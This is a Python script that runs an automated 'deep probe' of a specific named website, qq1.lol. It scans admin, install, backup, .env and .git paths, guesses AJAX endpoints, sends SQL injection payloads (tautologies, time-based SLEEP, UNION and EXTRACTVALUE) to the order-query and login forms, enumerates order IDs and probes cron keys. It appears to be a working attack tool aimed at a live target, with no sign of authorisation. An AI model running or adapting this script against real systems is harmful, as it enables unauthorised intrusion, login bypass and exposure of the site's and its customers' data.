#!/usr/bin/env python3
"""qq1.lol deep probe - path scan, ajax, sqli, info leak"""
import json, re, sys, time, urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://qq1.lol"
OUT = "/data/automation/results/qq1.lol"
TIMEOUT = 12
sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Referer": BASE + "/",
    "X-Requested-With": "XMLHttpRequest",
})

def log(msg):
    print(msg, flush=True)

def get_csrf(url=BASE + "/"):
    r = sess.get(url, timeout=TIMEOUT)
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', r.text)
    return m.group(1) if m else ""

def ajax(act, data=None, method="POST"):
    url = f"{BASE}/ajax.php?act={act}"
    try:
        if method == "GET":
            r = sess.get(url, params=data, timeout=TIMEOUT)
        else:
            r = sess.post(url, data=data or {}, timeout=TIMEOUT)
        return r.status_code, r.text[:3000]
    except Exception as e:
        return 0, str(e)

def path_scan():
    paths = [
        # admin variants
        "admin", "admin/", "admin.php", "admin/login.php", "admin/index.php",
        "manage", "manage/", "manage.php", "manager", "backend", "htgl",
        "shequ", "shequ/", "fenzhan", "fenzhan/", "agent", "agent/",
        "sup", "sup/", "supplier", "master", "console", "panel",
        # faka system
        "install/", "install/index.php", "install/install.lock",
        "cron.php", "config.php", ".env", ".git/HEAD", ".git/config",
        "api/", "api.php", "ajax.php", "toollogs.php",
        # user
        "user/", "user/login.php", "user/reg.php", "user/recharge.php",
        "user/findpwd.php", "user/connect.php", "user/index.php",
        "user/ajax.php", "user/api.php",
        # other common
        "other/submit.php", "pay.php", "notify.php", "callback.php",
        "upload/", "upload.php", "backup/", "data/", "runtime/",
        "phpinfo.php", "info.php", "test.php", "debug.php",
        "robots.txt", "sitemap.xml", ".well-known/security.txt",
        # faka assets source
        "assets/faka/", "includes/", "inc/", "core/", "system/",
        "template/", "templates/", "cache/", "logs/", "log/",
        # related
        "m/", "wap/", "mobile/", "app/", "h5/",
    ]
    results = []
    def probe(p):
        try:
            r = sess.get(f"{BASE}/{p}", timeout=TIMEOUT, allow_redirects=False)
            body = r.text[:200].replace("\n", " ")
            interesting = r.status_code not in (404, 403) or "install" in body.lower() or "login" in body.lower()
            if interesting or r.status_code in (301, 302, 401, 500):
                return (p, r.status_code, len(r.text), body)
        except Exception as e:
            return (p, 0, 0, str(e)[:100])
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        for f in as_completed([ex.submit(probe, p) for p in paths]):
            r = f.result()
            if r:
                results.append(r)
                log(f"  [{r[1]}] {r[0]} ({r[2]}b) {r[3][:80]}")
    return results

def test_ajax_actions():
    actions = [
        "getcount", "getclass", "gettool", "gettoolnew", "getleftcount",
        "checklogin", "query", "order", "captcha", "cart_info", "cart_list",
        "gift_start", "getshareid", "getshuoshuo",
        # extra guesses
        "login", "reg", "userinfo", "pay", "notify", "upload", "config",
        "getorder", "orderlist", "getuser", "recharge", "withdraw",
        "admin", "siteinfo", "getconfig", "getsite", "getmoney",
    ]
    results = {}
    for act in actions:
        code, body = ajax(act)
        results[act] = {"code": code, "body": body[:500]}
        marker = " ***" if body and '"code":0' in body else ""
        log(f"  ajax/{act}: HTTP {code}{marker} -> {body[:120]}")
    return results

def test_query_sqli():
    payloads = [
        "1", "1'", "1' OR '1'='1", "1' AND SLEEP(3)-- -",
        "' OR 1=1-- -", "1 UNION SELECT 1,2,3-- -",
        "admin'--", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
    ]
    results = []
    for p in payloads:
        # GET query
        try:
            t0 = time.time()
            r = sess.get(f"{BASE}/?mod=query&data={urllib.parse.quote(p)}", timeout=15)
            elapsed = time.time() - t0
            has_order = "orderItem" in r.text or "订单" in r.text and "没有任何订单" not in r.text
            results.append(("GET", p, r.status_code, elapsed, has_order, r.text[:200]))
            log(f"  query GET [{p[:30]}] {elapsed:.2f}s order={has_order}")
        except Exception as e:
            results.append(("GET", p, 0, 0, False, str(e)))
        # ajax query
        code, body = ajax("query", {"data": p})
        results.append(("ajax", p, code, 0, '"code":0' in body, body[:200]))
    return results

def test_login_sqli():
    payloads = [
        ("admin", "admin"), ("admin'--", "x"), ("' OR '1'='1", "' OR '1'='1"),
        ("admin' OR '1'='1'-- -", "x"), ("1' AND SLEEP(3)-- -", "x"),
    ]
    results = []
    csrf = get_csrf(BASE + "/user/login.php")
    for user, pwd in payloads:
        try:
            t0 = time.time()
            r = sess.post(f"{BASE}/user/login.php", data={
                "user": user, "pass": pwd, "csrf_token": csrf,
            }, timeout=15, allow_redirects=False)
            elapsed = time.time() - t0
            msg = re.search(r'id="msg"[^>]*>([^<]*)', r.text)
            msg = msg.group(1) if msg else r.text[:100]
            results.append((user, pwd, r.status_code, elapsed, msg[:100]))
            log(f"  login [{user[:20]}] {elapsed:.2f}s -> {msg[:60]}")
        except Exception as e:
            results.append((user, pwd, 0, 0, str(e)))
    return results

def test_order_enum():
    results = []
    for oid in [1, 100, 1000, 10000, 25900, 25915]:
        r = sess.get(f"{BASE}/?mod=query&data={oid}", timeout=TIMEOUT)
        has = "orderItem" in r.text or ("订单ID" in r.text and "没有任何订单" not in r.text)
        results.append((oid, has, r.text[:300]))
        log(f"  order#{oid}: found={has}")
    return results

def test_install_cron():
    results = {}
    for path in ["install/", "install/index.php", "cron.php", "cron.php?key=test",
                 "cron.php?do=update", "cron.php?key=123456"]:
        try:
            r = sess.get(f"{BASE}/{path}", timeout=TIMEOUT)
            results[path] = (r.status_code, r.text[:500])
            log(f"  {path}: [{r.status_code}] {r.text[:100]}")
        except Exception as e:
            results[path] = (0, str(e))
    return results

def extract_js_info():
    pages = ["/", "/?mod=query", "/user/login.php", "/user/reg.php"]
    findings = {"scripts": [], "endpoints": set(), "domains": set()}
    for p in pages:
        r = sess.get(BASE + p, timeout=TIMEOUT)
        for s in re.findall(r'src="([^"]+)"', r.text):
            findings["scripts"].append(s)
        for e in re.findall(r'(?:ajax\.php\?act=|/user/|/other/)[a-zA-Z0-9_./?=&-]+', r.text):
            findings["endpoints"].add(e)
        for d in re.findall(r'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}', r.text):
            findings["domains"].add(d)
    # fetch query.js
    try:
        r = sess.get(BASE + "/assets/faka/js/query.js?ver=VERSION", timeout=TIMEOUT)
        findings["query_js"] = r.text[:2000]
        for e in re.findall(r'act=[a-z_]+', r.text):
            findings["endpoints"].add(e)
    except Exception:
        pass
    findings["endpoints"] = sorted(findings["endpoints"])
    findings["domains"] = sorted(findings["domains"])
    return findings

def main():
    import os
    os.makedirs(OUT, exist_ok=True)
    log("=== qq1.lol deep probe ===")
    sess.get(BASE, timeout=TIMEOUT)

    report = {"ts": time.strftime("%Y-%m-%d %H:%M:%S")}

    log("\n[1] Path scan")
    report["paths"] = path_scan()

    log("\n[2] Ajax actions")
    report["ajax"] = test_ajax_actions()

    log("\n[3] Order query SQLi")
    report["query_sqli"] = test_query_sqli()

    log("\n[4] Login SQLi")
    report["login_sqli"] = test_login_sqli()

    log("\n[5] Order enumeration")
    report["orders"] = test_order_enum()

    log("\n[6] Install/Cron")
    report["install_cron"] = test_install_cron()

    log("\n[7] JS/Domain extraction")
    report["js_info"] = extract_js_info()
    for d in report["js_info"].get("domains", []):
        log(f"  domain: {d}")

    # save getclass/gettool samples
    _, class_body = ajax("getclass")
    _, tool_body = ajax("gettool")
    with open(f"{OUT}/getclass.json", "w") as f:
        f.write(class_body)
    with open(f"{OUT}/gettool_sample.json", "w") as f:
        f.write(tool_body[:5000])

    out_file = f"{OUT}/deep_probe_report.json"
    with open(out_file, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False, default=str)
    log(f"\n=== Done -> {out_file} ===")

if __name__ == "__main__":
    main()
